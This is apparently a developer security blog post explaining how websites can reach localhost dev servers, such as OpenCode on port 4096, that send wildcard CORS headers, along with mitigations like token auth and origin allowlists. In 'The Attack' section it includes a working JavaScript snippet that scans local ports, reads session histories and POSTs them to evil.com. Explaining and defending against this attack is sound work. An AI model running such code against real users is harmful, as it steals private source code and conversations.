# Localhost Is Not a Firewall

Every time you run a dev server, you open a door. `npm run dev`, `opencode`, `jupyter notebook`, `docker`: they all bind to localhost and listen for connections. The implicit assumption is that localhost is safe. Only you can connect, right?

Wrong. Any website you visit can send requests to localhost. And if that server responds with `Access-Control-Allow-Origin: *`, the website can read the response too.

This article explains why, and why the industry has collectively decided not to care.

---

## The Attack

You're working on a project. OpenCode is running on port 4096. You take a break and browse Reddit. One of the links goes to a sketchy site. That site runs this JavaScript:

```javascript
// Probe for OpenCode
for (let port = 4096; port < 4200; port++) {
	fetch(`http://localhost:${port}/session/list`)
		.then((r) => r.json())
		.then((sessions) => {
			// Found it. Now exfiltrate session history.
			sessions.forEach((s) => {
				fetch(`http://localhost:${port}/session/${s.id}/messages`)
					.then((r) => r.json())
					.then((messages) => {
						// Send your code and AI conversations to attacker's server
						fetch('https://evil.com/collect', {
							method: 'POST',
							body: JSON.stringify({ port, session: s.id, messages }),
						});
					});
			});
		})
		.catch(() => {}); // Port not open or wrong service, try next
}
```

If the dev server returns `Access-Control-Allow-Origin: *` (and many do), this works. The attacker now has your session history, code snippets, API responses. Whatever that localhost server exposes.

---

## Why Browsers Allow This

The browser's same-origin policy is designed to prevent `evil.com` from reading data from `bank.com`. But localhost isn't special to the browser. It's just another origin.

**What the same-origin policy does:**

- Prevents cross-origin reads by default
- Allows cross-origin writes (form submissions, fetch POST)
- Can be relaxed with CORS headers

**What it doesn't do:**

- Prevent requests from being sent
- Treat localhost as privileged
- Block connections to local network IPs

When you visit `evil.com`, JavaScript on that page can:

1. `fetch('http://localhost:4096/...')`: request is sent
2. Server processes request: side effects happen
3. Browser checks CORS headers: decides if JS can read response

Steps 1 and 2 happen regardless of CORS. If the server does something destructive on a POST request, the damage is done before the browser even checks headers.

And if the server returns `Access-Control-Allow-Origin: *`, step 3 passes too. The attacker reads everything.

---

## The CORS: \* Epidemic

Here's what OpenCode's server does:

```typescript
import { cors } from 'hono/cors';

app.use(cors()); // Defaults to Access-Control-Allow-Origin: *
```

This is common. Many dev tools do this because:

1. **Convenience**: no CORS errors when accessing from different ports
2. **"It's just local"**: assumption that localhost is safe
3. **Copy-paste culture**: tutorials show `cors()` with no options

The result: a dev server that accepts requests from any origin and lets any origin read responses.

---

## Tools That Are Vulnerable

| Tool               | Default Behavior              | Mitigation             |
| ------------------ | ----------------------------- | ---------------------- |
| OpenCode           | CORS: \*, no auth             | None                   |
| Jupyter Notebook   | Was open → now requires token | Token in URL           |
| webpack-dev-server | CORS: \* in dev               | None (by design)       |
| Vite               | CORS: \* in dev               | None (by design)       |
| Create React App   | CORS: \* in dev               | None (by design)       |
| Docker API         | No auth if TCP-exposed        | Unix socket by default |
| Redis              | No auth by default            | Bind to 127.0.0.1 only |
| Elasticsearch      | No auth by default            | Security plugin (paid) |

The pattern: tools ship wide open, security is opt-in (if available at all).

---

## "But It's Only Localhost"

The mental model most developers have:

```
Internet ─── Firewall ─── Your Machine ─── Localhost
                                              │
                              "Safe zone, only I can access"
```

The actual model:

```
Internet ─── Browser ─── JavaScript ─── fetch('localhost:...')
                              │
              "Browser JS can hit any local port"
```

Your browser is a bridge. Every tab is a potential attacker with access to your local network.

---

## What Attackers Can Do

**With a vulnerable localhost server:**

| If attacker can...  | They can...                                   |
| ------------------- | --------------------------------------------- |
| Read responses      | Exfiltrate source code, secrets, session data |
| Send POST requests  | Trigger actions, modify files, run commands   |
| Open WebSockets     | Get real-time access to terminals, logs       |
| Guess/enumerate IDs | Access sessions, files, resources             |

**Real-world examples:**

- **2018**: Researchers showed they could steal code from VS Code's live share via localhost
- **2019**: Jupyter Notebook attacks in the wild → led to mandatory token auth
- **2020**: Docker API exploits for cryptomining (when exposed on TCP)
- **Ongoing**: Electron apps with localhost servers are frequent targets

---

## Why the Industry Doesn't Fix This

**Developer experience wins:**

Adding authentication means:

- Copying tokens from terminal to browser
- Dealing with "401 Unauthorized" errors
- Explaining to users why they need a token for a local server

Most developers would call this "friction" and disable it.

**"It's a dev tool":**

The argument goes: "This only runs on your machine during development. If your machine is compromised, you have bigger problems."

This ignores that browsing the web IS the attack vector. You don't need malware. You need one bad link.

**Nobody wants to be first:**

If Vite adds mandatory auth and webpack doesn't, developers will complain that Vite is "harder to use." There's a race to the bottom on security friction.

---

## What Good Looks Like

Some tools do this right:

**Jupyter Notebook:**

```
http://localhost:8888/?token=abc123def456...
```

Token generated on startup, required for all requests. Annoying? Slightly. Secure? Yes.

**VS Code Server:**

```
http://localhost:8080/?tkn=xyz789...
```

Same pattern. The token is printed to terminal, you copy it once.

**Proper CORS:**

```typescript
app.use(
	cors({
		origin: ['http://localhost:3000', 'http://127.0.0.1:3000'],
		// Only allow requests from your own dev server
	}),
);
```

Explicit allowlist instead of `*`.

---

## What You Can Do

**As a user:**

1. **Be aware**: that dev server is a door to your machine
2. **Use the desktop app when available**: OpenCode's desktop app doesn't expose HTTP
3. **Close dev servers when not using them**: don't leave them running overnight
4. **Segment browsing**: use a different browser/profile for sketchy sites

**As a tool author:**

1. **Don't default to CORS: \***: require explicit origin configuration
2. **Add token auth**: generate on startup, print to terminal
3. **Check Origin header**: reject requests from non-localhost origins
4. **Document the risk**: let users make informed choices

**As an industry:**

Maybe we should stop accepting "it's just for development" as an excuse. The browser doesn't know the difference between your bank and your dev server. Both are just HTTP endpoints.

---

## The Uncomfortable Truth

This has been a known issue for over a decade. The industry response has been:

1. Acknowledge it exists
2. Decide it's not worth the UX cost to fix
3. Hope users don't visit malicious sites while coding

That's not security. That's wishful thinking.

Every dev server you run is trusting every website you visit. That's the deal we've implicitly accepted. Maybe it's time to renegotiate.

---

## Further Reading

- [The Dangers of Google Chrome's Localhost Access](https://medium.com/@petehouston/the-dangers-of-google-chromes-localhost-access-7b4d6c1d1a0a)
- [Jupyter Notebook Security Advisory](https://blog.jupyter.org/jupyter-notebook-security-fixes-released-4a9d4d9ecdd7)
- [DNS Rebinding Attacks Explained](https://github.com/nccgroup/singularity)
- [Attacking Local Network Applications from the Browser](https://www.forcepoint.com/blog/x-labs/attacking-internal-network-browser)

---

## Update: It Happened

In January 2026, OpenCode got [CVE-2026-22812](https://github.com/anomalyco/opencode/security/advisories/GHSA-vxw4-wv6m-9hhh): CVSS 8.8, exactly the attack described above. The JavaScript in "The Attack" section wasn't hypothetical; it was a working exploit. OpenCode has since added `OPENCODE_SERVER_PASSWORD` (HTTP Basic Auth) and made the server opt-in. Full writeup: [OpenCode Got an RCE and I Already Wrote the Exploit](./opencode-rce-called-it.md).
